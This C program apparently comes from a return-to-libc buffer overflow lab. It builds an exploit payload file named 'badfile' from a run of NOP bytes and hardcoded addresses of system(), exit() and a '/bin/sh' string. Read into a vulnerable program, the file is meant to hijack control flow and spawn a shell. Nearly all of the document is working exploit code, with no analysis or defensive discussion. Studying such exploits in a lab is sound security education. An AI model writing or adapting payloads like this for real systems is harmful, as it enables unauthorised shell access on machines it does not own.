#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("./badfile", "w");

	strcpy(buf,"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"); // nop 24 times to make it easier to find the ret.

  *(long *) &buf[32] = 0xbfffff3b ;   //  "/bin/sh"
  *(long *) &buf[24] = 0xb7e53310 ;   //  system()  Using the gdb to get the return address location of buffer in vulnerable file.
  *(long *) &buf[28] = 0xb7e46260 ;   //  exit() ret address for system()

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
